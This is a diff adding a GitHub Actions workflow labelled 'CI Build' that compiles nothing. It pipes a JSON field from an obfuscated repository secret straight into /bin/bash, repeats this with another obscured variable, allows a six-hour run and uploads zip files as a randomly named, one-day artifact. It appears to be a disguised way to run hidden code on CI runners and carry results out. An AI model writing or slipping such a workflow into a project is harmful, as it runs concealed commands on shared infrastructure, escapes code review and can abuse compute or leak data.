@@ -1,0 +1,27 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          smru03622: ${{ secrets.smru03622 }}
+        run: |
+          printf '%s' "$smru03622" | jq -r .nd684 | /bin/bash
+          echo $ijvxo756 | jq -r .t2985 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CrvsjAW6
+          path: "*.zip"
+          retention-days: 1
